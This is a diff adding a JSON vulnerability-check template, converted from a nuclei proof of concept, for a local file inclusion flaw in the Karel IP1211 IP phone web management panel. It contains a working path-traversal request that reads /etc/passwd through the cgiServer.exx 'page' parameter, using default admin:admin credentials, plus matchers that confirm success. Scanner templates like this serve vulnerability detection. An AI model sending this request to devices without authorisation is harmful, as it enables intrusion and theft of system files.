@@ -1,0 +1,150 @@
+{
+  "id": "karel-ip-phone-lfi",
+  "name": "Karel IP Phone IP1211 Web Management Panel - Local File Inclusion",
+  "author": "0x_Akoko",
+  "severity": "HIGH",
+  "description": "Karel IP Phone IP1211 Web Management Panel is vulnerable to local file inclusion and can allow remote attackers to access arbitrary files stored on the remote device via the \u0027cgiServer.exx\u0027 endpoint and the \u0027page\u0027 parameter.",
+  "references": [
+    "https://cxsecurity.com/issue/WLB-2020100038",
+    "https://www.karel.com.tr/urun-cozum/ip1211-ip-telefon"
+  ],
+  "tags": [
+    "karel",
+    "lfi"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "cweId": "CWE-22",
+  "cvssScore": "7.5",
+  "cvssMetrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/cgi-bin/cgiServer.exx?page\u003d../../../../../../../../../../../etc/passwd",
+      "headers": {
+        "Authorization": "Basic YWRtaW46YWRtaW4\u003d"
+      },
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "REGEX",
+          "part": "body",
+          "values": [
+            "root:[x*]:0:0"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "internal": "true",
+          "group": 1
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "karel-ip-phone-lfi",
+    "info": {
+      "name": "Karel IP Phone IP1211 Web Management Panel - Local File Inclusion",
+      "author": "0x_Akoko",
+      "severity": "high",
+      "description": "Karel IP Phone IP1211 Web Management Panel is vulnerable to local file inclusion and can allow remote attackers to access arbitrary files stored on the remote device via the \u0027cgiServer.exx\u0027 endpoint and the \u0027page\u0027 parameter.",
+      "reference": [
+        "https://cxsecurity.com/issue/WLB-2020100038",
+        "https://www.karel.com.tr/urun-cozum/ip1211-ip-telefon"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+        "cvss_score": "7.5",
+        "cwe_id": "CWE-22"
+      },
+      "metadata": {
+        "max_request": 1
+      },
+      "tags": "karel,lfi"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/cgi-bin/cgiServer.exx?page\u003d../../../../../../../../../../../etc/passwd"
+        ],
+        "headers": {
+          "Authorization": "Basic YWRtaW46YWRtaW4\u003d"
+        },
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "regex",
+            "part": "body",
+            "regex": [
+              "root:[x*]:0:0"
+            ],
+            "group": 1,
+            "internal": true
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
